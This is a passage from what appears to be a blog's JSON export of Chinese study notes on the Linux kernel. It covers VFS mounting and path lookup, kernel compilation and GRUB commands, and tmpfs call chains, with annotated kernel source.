mnt return mnt;&#125;EXPORT_SYMBOL_GPL(vfs_kern_mount); fc_mount 用于挂载一个文件系统 vfs_get_tree identifier - Linux source code (v6.3.8) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162/** * vfs_get_tree - Get the mountable root * @fc: The superblock configuration context. * * The filesystem is invoked to get or create a superblock which can then later * be used for mounting. The filesystem places a pointer to the root to be * used for mounting in @fc-&gt;root. */int vfs_get_tree(struct fs_context *fc)&#123; // 声明一个指向 super_block 结构体的指针 sb，用于表示文件系统的超级块 struct super_block *sb; // 声明一个整型变量 error，用于存储返回值 int error; // 检查传入的文件系统上下文 fc 的 root 是否已经设置 if (fc-&gt;root) return -EBUSY; // 如果已经设置，返回错误代码 -EBUSY // 调用文件系统操作（ops）中的 get_tree 函数，获取或创建文件系统树 error = fc-&gt;ops-&gt;get_tree(fc); if (error &lt; 0) return error; // 如果操作失败，返回错误代码 // 检查 fc-&gt;root 是否已经设置 if (!fc-&gt;root) &#123; // 如果没有设置，输出错误信息，并触发 BUG（内核调试宏） pr_err(&quot;Filesystem %s get_tree() didn&#x27;t set fc-&gt;root\\n&quot;, fc-&gt;fs_type-&gt;name); BUG(); &#125; // 获取超级块指针 sb = fc-&gt;root-&gt;d_sb; // 检查超级块的块设备映射 (s_bdi) 是否已经设置 WARN_ON(!sb-&gt;s_bdi); // 将写内存屏障放在设置 SB_BORN 标志位之前，以确保超级块结构已经设置完成 smp_wmb(); // 为超级块设置 SB_BORN 标志位，表示文件系统已经创建 sb-&gt;s_flags |= SB_BORN; // 调用 security_sb_set_mnt_opts 函数设置安全模块的挂载选项 error = security_sb_set_mnt_opts(sb, fc-&gt;security, 0, NULL); if (unlikely(error)) &#123; // 如果设置失败，释放文件系统上下文的引用并返回错误代码 fc_drop_locked(fc); return error; &#125; // 输出警告信息，如果文件系统设置的 s_maxbytes 值小于 0 WARN((sb-&gt;s_maxbytes &lt; 0), &quot;%s set sb-&gt;s_maxbytes to &quot; &quot;negative value (%lld)\\n&quot;, fc-&gt;fs_type-&gt;name, sb-&gt;s_maxbytes); // 返回操作成功（错误代码为 0） return 0;&#125;EXPORT_SYMBOL(vfs_get_tree); 安装根文件系统是系统初始化的关键部分。当系统启动时，就要在变量ROOT_DEV中寻找包含根文件系统的磁盘主码。当编译内核或向最初的启动装入程序传递一个合适的选项时，根文件系统可以被指定为&#x2F;dev目录下的一个设备文件。类似地，根文件系统的安装标志存放在root_mountflags变量中。用户可以指定这些标志，这是通过对已编译的内核映像使用&#x2F;sbin&#x2F;rdev外部程序，或者向最初的启动装入程序传递一个合适的选项来达到的。 在系统初始化期间，mount_root()安装根文件系统。 mount_root identifier - Linux source code (v6.3.8) - Bootlin 1234567891011121314151617181920212223242526272829303132333435void __init mount_root(void) &#123; #ifdef CONFIG_ROOT_NFS // 如果根文件系统位于 NFS 上,尝试挂载 NFS 根文件系统 if (ROOT_DEV == Root_NFS) &#123; if (!mount_nfs_root()) printk(KERN_ERR &quot;VFS: Unable to mount root fs via NFS.\\n&quot;); return; &#125; #endif #ifdef CONFIG_CIFS_ROOT // 如果根文件系统位于 CIFS(SMB) 上,尝试挂载 CIFS 根文件系统 if (ROOT_DEV == Root_CIFS) &#123; if (!mount_cifs_root()) printk(KERN_ERR &quot;VFS: Unable to mount root fs via SMB.\\n&quot;); return; &#125; #endif if (ROOT_DEV == 0 &amp;&amp; root_device_name &amp;&amp; root_fs_names) &#123; // 如果根设备为空(0),并且命令行指定了根设备名和根文件系统类型, // 尝试挂载一个无块设备的根文件系统(如 initramfs)。 if (mount_nodev_root() == 0) return; &#125; #ifdef CONFIG_BLOCK &#123; // 为根块设备创建一个 /dev/root 节点 int err = create_dev(&quot;/dev/root&quot;, ROOT_DEV); if (err &lt; 0) pr_emerg(&quot;Failed to create /dev/root: %d\\n&quot;, err); // 使用 /dev/root 和指定的挂载标志来挂载块设备根文件系统 mount_block_root(&quot;/dev/root&quot;, root_mountflags); &#125; #endif &#125; 安装一个普通的文件系统一旦完成对根文件系统的初始化，就可以安装其他的文件系统。其中的每一个都有自己的安装点，安装点仅仅是系统目录树中现有的一个目录。 打开文件或者创建文件 一个主要操作是根据给定的文件名查找inode，这使得我们首先需要了解有关查找该信息的机制。 nameidata结构体用来查找函数传递参数数，并保存查找结果。 nameidata identifier - Linux source code (v6.3.8) - Bootlin 123456789101112131415161718192021222324#define EMBEDDED_LEVELS 2struct nameidata &#123; struct path path; // 路径对象，表示路径 struct qstr last; // 最后的路径组件 struct path root; // 文件系统的根路径 struct inode *inode; // 指向路径中的目录项的节点 (path.dentry.d_inode) unsigned int flags, state; // 标志位和状态 unsigned seq, next_seq, m_seq, r_seq; // 用于序列号的变量 int last_type; // 最后路径组件的类型 unsigned depth; // 链接深度 int total_link_count; // 总的链接数 struct saved &#123; // 保存结构，用于链接跟踪 struct path link; // 链接路径 struct delayed_call done; // 延迟调用 const char *name; // 链接名称 unsigned seq; // 序列号 &#125; *stack, internal[EMBEDDED_LEVELS]; // 保存结构的栈和内部数组 struct filename *name; // 文件名对象 struct nameidata *saved; // 指向保存的nameidata结构 unsigned root_seq; // 根路径序列号 int dfd; // 目录文件描述符 vfsuid_t dir_vfsuid; // 目录的VFS用户ID umode_t dir_mode; // 目录的模式 (权限)&#125; __randomize_layout; // 随机化布局属性 在走一条路的整个过程中，当前状态存储在一个 struct nameidata ，“namei”是将“名称”转换为“inode”的函数的传统名称 - 可以追溯到第一版Unix。 struct nameidata 包含（除其他字段外）： path包含了找到的文件系统项的数据，path结构包含dentry和mnt。 struct path path path identifier - Linux source code (v6.3.8) - Bootlin 1234struct path &#123; struct vfsmount *mnt; struct dentry *dentry;&#125; __randomize_layout; 包含struct vfsmount和struct dentry，这些一起记录了现在walk的状态，他们首先。它们首先引用起点（当前工作目录，根目录或由文件描述符标识的其他目录），并在每一步中更新，即在遍历过程的每一步中，这些结构体都会更新。通过d_lockref和mnt_count始终持有的引用。 struct qstr last 这是一个字符串，长度（即未 nul 终止）是路径名中的“下一个”组件。 qstr identifier - Linux source code (v6.3.8) - Bootlin 12345678910111213141516/* * &quot;quick string&quot; -- eases parameter passing, but more importantly * saves &quot;metadata&quot; about the string (ie length and the hash). * * hash comes first so it snuggles against d_parent in the * dentry. */struct qstr &#123; union &#123; struct &#123; HASH_LEN_DECLARE; &#125;; u64 hash_len; &#125;; const unsigned char *name;&#125;; int last_type 这是LAST_NORM, LAST_ROOT, LAST_DOT 或者 LAST_DOTDOT其中一个。 struct path root 用于在内核中表示文件系统的有效根目录。在路径查找过程中，它可以确保始终有一个有效的根目录参考。这个结构体包含两个主要成员：dentry 和 mnt。dentry 是目录项，用于表示目录结构中的一个节点。mnt 是一个 vfsmount 结构，代表一个挂载点，用于连接不同文件系统。例如查找/home/path/test.txt时，根目录就是/，root表示的就是&#x2F;的信息。 保证路径查找不会超出特定文件系统的边界。当使用像 chroot() 这样的系统调用时，struct path root 可以确保路径查找仅限于指定的文件系统子树。 在处理像 NFSv4、Btrfs 这样的分布式或者层次化文件系统时，struct path root 可以确保正确处理不同子树的根目录，防止路径查找错误地跳转到其他子树或文件系统。 在处理特殊的路径操作，如 LOOKUP_IN_ROOT 和 LOOKUP_BENEATH 时，struct path root 可以确保路径查找以特定目录作为根路径进行。 在处理绝对路径和相对路径时，struct path root 可以作为查找的基准点。例如，当路径名以 / 开头，或者处理 .. 组件时，struct path root 是必需的。 现在，我们可以忽略符号链接的处理，描述 link_path_walk() 函数，该函数处理除最后一个组件之外的所有内容： 给定一个路径（name）和一个 nameidata 结构（nd），检查当前目录是否具有执行权限，然后将 name 逐个推进到一个组件，同时更新 last_type 和 last。如果这是最后一个组件，则返回；否则调用 walk_component() 并从顶部重复。 walk_component() 函数非常简单。如果组件是 LAST_DOTS，它会调用 handle_dots()，该函数会执行已经描述过的必要锁定操作。如果找到 LAST_NORM 组件，它首先调用 lookup_fast()，该函数仅在目录缓存中查找，但如果是需要重新验证结果的文件系统类型，它会要求文件系统重新验证结果。如果没有得到好的结果，它会调用 lookup_slow()，该函数会获取 i_rwsem，重新检查缓存，然后要求文件系统找到确切的答案。 walk_component() 的最后一步是调用 step_into() 函数，它可以直接从 walk_component() 或者 handle_dots() 调用。它会调用 handle_mounts() 函数来检查和处理挂载点，这时会创建一个包含对新 dentry 的计数引用和对新 vfsmount 的引用的新 struct path。只有在新 vfsmount 与之前的 vfsmount 不同时，新 vfsmount 的引用才会被计数。然后，如果有符号链接，step_into() 会调用 pick_link() 函数处理它，否则它会将新的 struct path 安装到 struct nameidata 中，并删除不再需要的引用。 link_path_walk() 函数只会处理路径中的最后一个组件，设置 nd-&gt;last 和 nd-&gt;last_type，但它不会调用 walk_component() 函数。处理最后的组件留给了调用者，这些调用者分别是 path_lookupat()、path_parentat() 和 path_openat()，它们分别处理不同系统调用的需求。 path_parentat()：这个函数相对简单，它在 link_path_walk() 周围添加了一些额外的操作，然后将父目录和最后的组件返回给调用者。调用者可能会试图通过 filename_create() 函数创建一个名称，或者移除或重命名一个名称（这种情况下会使用 user_path_parent() 函数）。在执行操作之前，它们会使用 i_rwsem 来确保没有其他更改。 例如，当用户调用 mkdir() 函数时，它会调用 path_parentat() 函数来找到新目录的父目录。然后，内核可以根据返回的父目录创建新目录。 path_lookupat()：这个函数也相对简单，它用于查找现有对象，比如通过 stat() 或 chmod() 函数。它实际上只是通过调用 lookup_last() 函数在最后的组件上调用 walk_component()。path_lookupat() 只返回最后的 dentry。 例如，当用户调用 stat() 函数时，它会调用 path_lookupat() 函数来找到文件或目录的 dentry。然后，内核可以根据 dentry 提供文件或目录的元数据。 path_openat()：这个函数用于处理 open() 系统调用。通过支持函数（以 “open_last_lookups()” 开头），它包含了处理 O_CREAT（有或无 O_EXCL）、最后的 “&#x2F;” 字符和尾部符号链接等不同细微差别所需的所有复杂性。这个函数在某些情况下会使用 i_rwsem，具体取决于它找到的内容。 例如，当用户调用 open() 函数时，它会调用 path_openat() 函数来处理可能的不同操作，比如创建新文件、打开现有文件或处理尾部符号链接。 这些函数或调用它们的函数需要注意最后一个组件是否是 LAST_NORM。如果查找的目标是创建某个对象，那么 last_type 的任何值（除了 LAST_NORM）都会导致错误。例如，如果 path_parentat() 报告 LAST_DOTDOT，那么调用者将不会尝试创建该名称。它们还会通过测试 last.name[last.len] 来检查尾部斜杠。如果在最后一个组件之后有任何字符，那么这一定是一个尾部斜杠。 调用链下面看到这个调用链 12345678910111213141516171819202122232425262728293031323334open() └── do_sys_open └── do_sys_openat2 ├── get_unused_fd_flags(获取一个未使用的文件描述符) ├── do_filp_open(打开file f) │ ├── set_nameidata(初始化nameidata nd存放查找结果) │ │ └── __set_nameidata │ ├── path_openat(打开file) │ │ ├── alloc_empty_file(初始化一个空的file结构体) │ │ ├── path_init(初始化nameidata结构体nd，不同系统调用nd-&gt;path不同) │ │ ├── link_path_walk(处理符号链接) │ │ │ ├── lookup_fast │ │ │ │ └── __d_lookup_rcu │ │ │ │ └── hlist_bl_for_each_entry_rcu │ │ │ └── lookup_slow │ │ │ └── __lookup_slow │ │ │ └── 具体文件系统的lookup函数 │ │ └── open_last_lookups（创建新文件） │ │ ├── handle_dots(处理..和.) │ │ ├── lookup_fast │ │ │ └── __d_lookup_rcu │ │ │ └── hlist_bl_for_each_entry_rcu │ │ ├── lookup_open │ │ │ └── d_lookup │ │ │ └── __d_lookup │ │ ├── atomic_open(如果支持原子打开操作) │ │ ├── 具体文件的lookup(如果目录项仍在查找中) │ │ └── 具体文件的create(如果目录项的inode为空并且需要创建文件) │ │ │ └── do_open │ └── vfs_open │ └── do_dentry_open │ └── 具体文件系统的open └── fd_install Pathname lookup下面是查找&#x2F;home&#x2F;hust&#x2F;helloworld.txt时，link_path_walk中的循环处理每个组件 挂载文件系统后，就可以访问该文件系统上的文件。主要有两个步骤：查找名称以查找它指向的inode，然后访问inode 路径名 以斜杠开头的路径称为“绝对路径”，它从文件系统的根目录开始。 例如：&#x2F;home&#x2F;user&#x2F;documents&#x2F;report.txt 不以斜杠开头的路径称为“相对路径”，它从当前目录或通过给 “*at()” 系统调用（如 openat()）提供的文件描述符指定的其他位置开始。 例如：documents&#x2F;report.txt 在某些情况下，路径名可能既没有斜杠（slashes）也没有组件（components），换句话说，它可能是空的。虽然在 POSIX 标准中，这种情况通常是禁止的，但在 Linux 中，当给出 AT_EMPTY_PATH 标志时，某些 “*at()” 系统调用允许空路径名。 举例来说，如果你有一个指向可执行文件的打开的文件描述符，你可以通过调用 execveat() 函数，传递文件描述符、空路径和 AT_EMPTY_PATH 标志来执行该文件。在这种情况下，即使路径名为空，也可以完成文件的执行操作。 注意： 路径名可以分为两部分：最后一个组件和其他所有内容。其他所有内容通常是容易处理的，必须标识一个已存在的目录，否则会报告错误。最后一个组件的处理则更复杂。 不同的系统调用可能对最后一个组件有不同的解释（如是否创建它），有时它甚至可能不存在（如空路径名或仅包含斜杠的路径名）。 最后一个组件可能是 “.” 或 “..”，这两个组件的处理方式与其他组件不同。 如果路径名以斜杠结尾，如”&#x2F;tmp&#x2F;foo&#x2F;“，可能会认为最后一个组件为空。在很多情况下，这种处理方式可以得到正确的结果，但并非总是如此。特别是，mkdir() 和 rmdir() 函数会根据最后一个组件创建或删除目录，它们要求处理以斜杠结尾的路径名。 Linux 路径名处理代码（主要在 fs/namei.c）处理了所有这些问题。它会将路径分解为组件，将最后一个组件与其他所有内容分开处理，并检查尾部斜杠是否在不允许的地方使用。它还处理了并发访问的问题。 当一个进程在查找路径名时，另一个进程可能会进行影响查找的更改。例如，如果一个进程正在查找 “a&#x2F;b&#x2F;..”，而另一个进程将 “a&#x2F;b” 重命名为 “a&#x2F;c&#x2F;b”，第一个进程可能会成功地解析为 “a&#x2F;c”。这就是所谓的竞态条件，路径名查找的任务就是要防止它们产生破坏性影响。 大多数竞态条件更加微妙，很多可能的竞态条件可以在 “dcache”（目录缓存）的上下文中更清楚地看到。理解 “dcache” 是理解路径名查找的核心。 dcache dcache 缓存了文件系统中名称的信息，以便快速进行查找。每个 dcache 条目（dentry）包含三个重要字段：组件名称、指向父条目的指针和指向 inode 的指针。inode 包含有关具有给定名称的父项对象的更多信息。 dcache 除了加速查找外，还有其他用途。一个特别相关的用途是它与挂载表紧密集成。挂载表记录了哪个文件系统挂载在哪个位置，实际上存储的是哪个 dentry 安装在哪个其他 dentry 之上。 在处理 dcache 时，需要考虑两种类型的文件系统： 一类文件系统能确保 dcache 中的信息始终完全准确（尽管可能不完整）。这可以让 VFS 在不检查文件系统的情况下确定特定文件是否存在，同时 VFS 可以保护文件系统免受某些竞争和其他问题的影响。这类文件系统通常是本地文件系统，如 ext3、XFS 和 Btrfs。 例如，当你在本地文件系统（如 ext3）中创建一个新文件时，VFS 可以直接通过 dcache 来查找文件是否存在，而无需与底层文件系统进行交互。这样可以提高查找速度。 另一类文件系统无法提供这种保证，因为它们不能。这些通常是跨网络共享的文件系统，例如远程文件系统（如 NFS 和 9P）或集群文件系统（如 ocfs2 或 cephfs）。这些文件系统允许 VFS 重新验证缓存的信息，并必须提供自己的保护，以防止竞争条件。VFS 可以通过在 dentry 中设置的 DCACHE_OP_REVALIDATE 标志来检测这些文件系统。 例如，当你访问一个通过 NFS 共享的文件系统时，虽然 VFS 可以通过 dcache 加速查找，但是该文件系统无法保证 dcache 信息始终准确，因为远程文件可能被其他节点更改。在这种情况下，VFS 需要重新验证缓存的信息，并依赖底层文件系统提供保护，以防止竞态条件。 参考资料 A tour of the Linux VFS (tldp.org) The Virtual File System (VFS) — 虚拟文件系统 （VFS） (unitn.it) The Linux kernel: The Linux Virtual File System — Linux 内核：Linux 虚拟文件系统 (tue.nl) 虚拟文件系统_百度百科 (baidu.com) Linux操作系统学习笔记（十二）虚拟文件系统 | Ty-Chen’s Home Virtual file system - Wikipedia — 虚拟文件系统 - 维基百科 [高级操作系统] VFS详解（虚拟文件系统）_宇内虹游的博客-CSDN博客 File system - Wikipedia Yair Amir lectures (jhu.edu) linux虚拟文件系统浅析 - Linux操作系统：Ubuntu_Centos_Debian - 红黑联盟 (2cto.com) Filesystems in the Linux kernel — The Linux Kernel documentation — Linux 内核中的文件系统 — Linux 内核文档 Overview of the Linux Virtual File System — The Linux Kernel documentation — Linux 虚拟文件系统概述 — Linux 内核文档","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"},{"name":"VFS","slug":"Linux内核/VFS","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/VFS/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"学习 Linux 内核操作","slug":"学习-Linux-内核操作","date":"2023-06-13T08:04:01.000Z","updated":"2023-07-26T02:30:54.058Z","comments":true,"path":"2023/06/13/学习-Linux-内核操作/","link":"","permalink":"http://example.com/2023/06/13/%E5%AD%A6%E4%B9%A0-Linux-%E5%86%85%E6%A0%B8%E6%93%8D%E4%BD%9C/","excerpt":"内核基本操作 查看系统存在的内核 1dpkg --list | grep linux-image 更新menu.list 1sudo update-grub 显示当前的内核 升级内核 1sudo apt-get dist-upgrade 删除内核 带有image的文件是需要删除的，一定要写全版本等字符。其他相关文件会自动删除。 1sudo apt-get remove --purge linux-headers-2.6.32-24-generic 系统垃圾清理 清理旧版本的软件缓存 1sudo apt-get autoclean 清理所有软件缓存 1sudo apt-get clean 删除系统不再使用的孤立软件 1sudo apt-get autoremove 编译内核","text":"内核基本操作 查看系统存在的内核 1dpkg --list | grep linux-image 更新menu.list 1sudo update-grub 显示当前的内核 升级内核 1sudo apt-get dist-upgrade 删除内核 带有image的文件是需要删除的，一定要写全版本等字符。其他相关文件会自动删除。 1sudo apt-get remove --purge linux-headers-2.6.32-24-generic 系统垃圾清理 清理旧版本的软件缓存 1sudo apt-get autoclean 清理所有软件缓存 1sudo apt-get clean 删除系统不再使用的孤立软件 1sudo apt-get autoremove 编译内核 安装必备软件 123456sudo apt install makesudo apt install build-essentialsudo apt install libncurses5-devsudo apt install bisonsudo apt install flexsudo apt install libssl-dev 从The Linux Kernel Archives上下载源码，然后解压，并进入文件夹，运行如下命令 123make mrpropermake cleanmake menuconfig 权限不够就在命令前面加上sudo 在执行完make menuconfig后，会产生图形界面。选择下方的save，将内核配置保存在.config文件中，然后选择exit退出。在编译内核之前，可以通过修改.config的内容来修改内核配置。 配置完成后，编译内核并安装。 1sudo make -j$(nproc) 如果下列错误 运行下列命令 1sudo apt-get install libelf-dev 继续进行编译，如果遇到如下错误 1make[2]: *** 没有规则可制作目标“debian/canonical-certs.pem”，由“certs/x509_certificate_list” 需求。 停止。 1make[2]: *** 没有规则可制作目标“debian/canonical-revoked-certs.pem”，由“certs/x509_revocation_list” 需求。 停止。 那么运行如下命令 1scripts/config --disable SYSTEM_TRUSTED_KEYS 1scripts/config --disable SYSTEM_REVOCATION_KEYS 之后继续编译至完成,然后安装内核 12sudo make modules_installsudo make install 切换运行内核 查看当前内核的启动顺序 1cat /boot/grub/grub.cfg |grep menuentry 修改文件在启动时选择内核 1sudo vim /etc/default/grub 更新文件 1sudo update-grub 重启系统 1sudo reboot now 选择Advanced options for Ubuntu 选择要启动的内核 添加输出12345if (strstr(current-&gt;comm, &quot;cat&quot;))//过滤 printk(&quot;%p&quot;,f1);//输出printk(KERN_INFO &quot; %s\\n&quot;, ...); 切换cgroupv1-&gt;cgroupv212345sudo vim /etc/default/grubsystemd.unified_cgroup_hierarchy=1GRUB_CMDLINE_LINUX_DEFAULT=&quot;systemd.unified_cgroup_hierarchy=1&quot;sudo update-grubsudo reboot now 调试时命令1sudo stdbuf -o0 dmesg -w | tee -a dmesg.log 1sudo dmesg -w","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"}],"tags":[]},{"title":"学习 Linux 文件系统 tmpfs","slug":"学习-Linux-文件系统 tmpfs","date":"2023-06-10T12:58:52.000Z","updated":"2023-12-15T06:55:41.868Z","comments":true,"path":"2023/06/10/学习-Linux-文件系统 tmpfs/","link":"","permalink":"http://example.com/2023/06/10/%E5%AD%A6%E4%B9%A0-Linux-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%20tmpfs/","excerpt":"tmpfs简介tmpfs（英语：temporary file system） 是类Unix系统上暂存档存储空间的常见名称，通常以挂载文件系统方式实现，并将资料存储在易失性存储器而非永久存储设备中。和RAM disk的概念近似，但后者会呈现出具有完整文件系统的虚拟磁盘。 tmpfs的工作原理是，它使用计算机的内存来模拟一个文件系统，就像在硬盘上创建了一个虚拟的文件柜。当你在tmpfs上创建文件或文件夹时，实际上它们是存储在内存中的。这样，访问这些文件会非常快，因为内存的速度比硬盘快得多。但是，需要注意的是，当计算机关闭或重启时，内存中的数据会丢失，所以存储在tmpfs上的文件也会消失。","text":"tmpfs简介tmpfs（英语：temporary file system） 是类Unix系统上暂存档存储空间的常见名称，通常以挂载文件系统方式实现，并将资料存储在易失性存储器而非永久存储设备中。和RAM disk的概念近似，但后者会呈现出具有完整文件系统的虚拟磁盘。 tmpfs的工作原理是，它使用计算机的内存来模拟一个文件系统，就像在硬盘上创建了一个虚拟的文件柜。当你在tmpfs上创建文件或文件夹时，实际上它们是存储在内存中的。这样，访问这些文件会非常快，因为内存的速度比硬盘快得多。但是，需要注意的是，当计算机关闭或重启时，内存中的数据会丢失，所以存储在tmpfs上的文件也会消失。 tmpfs是一种特殊的文件系统，它可以让你把计算机的内存（RAM）当作硬盘来使用。这样做的优点是，因为内存的速度比硬盘快得多，所以访问存储在tmpfs上的文件会非常快。tmpfs通常用于存放临时文件，这些文件在计算机重启后会自动消失。这样可以避免硬盘上堆积很多不必要的临时文件，提高硬盘的使用效率和计算机的性能。 tmpfs文件系统使用创建和挂载tmpfs文件系统首先创建一个文件夹/home/plucky/path 运行mount命令，挂载tmpfs文件系统 1sudo mount -t tmpfs -o size=512M tmpfs 文件夹（/home/plucky/path) -t tmpfs表示我们要挂载的文件系统类型是tmpfs -o size=512M表示tmpfs文件系统的大小为512M字节 tmpfs是文件系统的名称 文件夹是挂载点的文件夹 现在，你已经成功挂载了一个tmpfs文件系统。您可以像使用普通目录一样使用它，例如在其中创建文件和子目录。但请记住，存储在此tmpfs文件系统上的文件和目录将仅保存在内存中，计算机重启后它们将消失。 在已经挂载的tmpfs文件系统中创建并存储一个新文件1$ echo &quot;This is a test file.&quot; &gt; /home/plucky/tmpfs/testfile.txt 假设已经将 tmpfs 文件系统挂载到了 /home/plucky/tmpfs 目录下。这个命令将在 /mnt/tmpfs 文件夹中创建一个名为 testfile.txt 的新文件，并写入文本 “This is a test file.”。 当这个命令执行时，将发生以下事情： 首先，shell 进程通过 open 或 openat 系统调用尝试创建或打开文件 /home/plucky/tmpfs/testfile.txt。系统调用的标志将包括 O_WRONLY（只写）和 O_CREAT（如果文件不存在则创建）。 内核将解析文件路径，并确认 /home/plucky/tmpfs 是一个已挂载的 tmpfs 文件系统。 在 tmpfs 文件系统中，内核将根据需要创建一个新的 inode。这涉及分配内存来存储 inode 本身以及文件的元数据（如权限、所有者等）。 文件创建成功后，shell 进程将获得一个文件描述符，用于写入文件。 然后，shell 进程通过 write 系统调用将文本 “This is a test file.” 写入文件。这将导致内核在 tmpfs 文件系统中分配内存来存储文件数据。 当文本被写入文件后，shell 进程使用 close 系统调用关闭文件描述符。 删除tmpfs文件系统的命令1rm /home/plucky/path/mytmpfs/testfile.txt 当运行此命令时，会发生以下事情： 首先，shell 进程通过 unlink 或 unlinkat 系统调用尝试删除文件 /home/plucky/path/mytmpfs/testfile.txt。 内核将解析文件路径，并确认 /mnt/tmpfs 是一个已挂载的 tmpfs 文件系统。 接下来，内核将通过 tmpfs 文件系统的 inode_operations 结构体中的 unlink 方法来执行删除操作。具体来说，对于 tmpfs，这个方法是 shmem_unlink。 shmem_unlink 函数将处理文件的内存释放。这包括释放文件数据占用的内存和文件元数据（如 inode）占用的内存。 最后，文件从文件系统中删除，不再可访问。 重启机器之后，tmpfs文件夹tmpfs文件系统中的文件被删除，而tmpfs文件系统也被卸载 如果要在系统启动时自动挂载tmpfs命令，需要将挂载信息添加到系统的启动配置文件中。这样每次系统启动时，该文件系统都会自动挂载。例如，要将一个 tmpfs 文件系统挂载到 /home/plucky/mytmpfs 目录，可以在 /etc/fstab 文件中添加以下行： 1tmpfs /home/plucky/mytmpfs tmpfs defaults 0 0 即运行一下命令 1sudo sh -c &#x27;echo &quot;tmpfs /home/plucky/path/mytmpfs tmpfs defaults 0 0&quot; &gt;&gt; /etc/fstab&#x27; sudo 命令用于以管理员权限运行此命令，因为 /etc/fstab 文件需要管理员权限才能修改。 tmpfs的实现函数调用链（Linux v6.3.6，v6.3.7为例） 挂载tmpfs文件系统： 12345678910mount └── do_mount └── path_mount └── do_new_mount ├── vfs_get_tree（基于给定的上下文创建并初始化一个新的文件系统实例） │ └── shmem_get_tree │ └── shmem_fill_super │ └── shmem_get_inode └── do_new_mount_fs └── do_add_mount 存储文件进入tmpfs文件系统： 打开文件或创建新文件： 1234567891011121314151617open() └── do_sys_open └── do_filp_open ├── path_openat │ ├── link_path_walk │ │ ├── lookup_fast │ │ │ └── __d_lookup_rcu │ │ │ └── hlist_bl_for_each_entry_rcu │ │ └── lookup_slow │ │ └── __lookup_slow │ │ └──simple_lookup │ └── open_last_lookups（创建新文件） │ └──shmem_create │ └── shmem_mknod └── do_open └── vfs_open └── do_dentry_open 读文件： 123456read() └── ksys_read └── vfs_read └── new_sync_read └── call_read_iter └── shmem_file_read_iter 写文件： 123456789write() └── ksys_write └── vfs_write └── new_sync_write └── call_write_iter └── generic_file_write_iter └── __generic_file_write_iter ├── generic_file_direct_write直写 └── generic_perform_write回写 删除文件： 1234unlink() └── do_unlinkat └── vfs_unlink └── shmem_unlink 挂载tmpfs文件系统流程当用户运行mount命令时，首先执行mount系统调用 1sudo mount -t tmpfs -o size=512M tmpfs 文件夹 mount系统调用sys_mount identifier - Linux source code (v6.3.6) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738394041424344// 系统调用的定义，包括5个参数：dev_name, dir_name, type, flags, data。SYSCALL_DEFINE5(mount, char __user *, dev_name, char __user *, dir_name, char __user *, type, unsigned long, flags, void __user *, data)&#123; int ret; // 用于存储返回值 char *kernel_type; // 从用户空间拷贝的文件系统类型字符串 char *kernel_dev; // 从用户空间拷贝的设备名或源字符串 void *options; // 从用户空间拷贝的挂载选项 // 将文件系统类型从用户空间拷贝到内核空间 kernel_type = copy_mount_string(type); // 检查拷贝操作是否出错 ret = PTR_ERR(kernel_type); if (IS_ERR(kernel_type)) goto out_type; // 将设备名或源从用户空间拷贝到内核空间 kernel_dev = copy_mount_string(dev_name); // 检查拷贝操作是否出错 ret = PTR_ERR(kernel_dev); if (IS_ERR(kernel_dev)) goto out_dev; // 将挂载选项从用户空间拷贝到内核空间 options = copy_mount_options(data); // 检查拷贝操作是否出错 ret = PTR_ERR(options); if (IS_ERR(options)) goto out_data; // 执行挂载操作 ret = do_mount(kernel_dev, dir_name, kernel_type, flags, options); // 释放挂载选项内存 kfree(options);out_data: // 释放设备名或源内存 kfree(kernel_dev);out_dev: // 释放文件系统类型内存 kfree(kernel_type);out_type: return ret; // 返回结果&#125; 首先将dev_name、dir_name、type和data这些从用户空间传入的参数拷贝到内核空间。然后，它调用do_mount函数来执行实际的挂载操作。 do_mount函数do_mount identifier - Linux source code (v6.3.6) - Bootlin 12345678910111213141516171819long do_mount(const char *dev_name, const char __user *dir_name, const char *type_page, unsigned long flags, void *data_page)&#123; struct path path; // 用于存储挂载点的路径结构 int ret; // 用于存储返回值 // 获取用户空间传入的挂载点路径，并将其解析为内核空间的路径结构 ret = user_path_at(AT_FDCWD, dir_name, LOOKUP_FOLLOW, &amp;path); if (ret) // 检查路径解析是否成功 return ret; // 执行实际的挂载操作 ret = path_mount(dev_name, &amp;path, type_page, flags, data_page); // 释放路径结构的引用 path_put(&amp;path); return ret; // 返回结果&#125; 首先通过user_path_at函数将用户空间传入的挂载点路径解析为内核空间的path结构。然后，调用path_mount函数执行实际的挂载操作。完成挂载操作后，释放path结构的引用。 path_mount函数path_mount identifier - Linux source code (v6.3.6) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687int path_mount(const char *dev_name, struct path *path, const char *type_page, unsigned long flags, void *data_page)&#123; unsigned int mnt_flags = 0, sb_flags; // 定义挂载标志和超级块标志 int ret; // 用于存储返回值 // 去除挂载标志的幻数（magic number） if ((flags &amp; MS_MGC_MSK) == MS_MGC_VAL) flags &amp;= ~MS_MGC_MSK; // 基本的参数检查 if (data_page) ((char *)data_page)[PAGE_SIZE - 1] = 0; // 检查不允许用户挂载的情况 if (flags &amp; MS_NOUSER) return -EINVAL; // 安全检查 ret = security_sb_mount(dev_name, path, type_page, flags, data_page); if (ret) return ret; if (!may_mount()) return -EPERM; if (flags &amp; SB_MANDLOCK) warn_mandlock(); // 默认设置为relatime，除非显式指定noatime if (!(flags &amp; MS_NOATIME)) mnt_flags |= MNT_RELATIME; // 分离每个挂载点的标志 if (flags &amp; MS_NOSUID) mnt_flags |= MNT_NOSUID; if (flags &amp; MS_NODEV) mnt_flags |= MNT_NODEV; if (flags &amp; MS_NOEXEC) mnt_flags |= MNT_NOEXEC; if (flags &amp; MS_NOATIME) mnt_flags |= MNT_NOATIME; if (flags &amp; MS_NODIRATIME) mnt_flags |= MNT_NODIRATIME; if (flags &amp; MS_STRICTATIME) mnt_flags &amp;= ~(MNT_RELATIME | MNT_NOATIME); if (flags &amp; MS_RDONLY) mnt_flags |= MNT_READONLY; if (flags &amp; 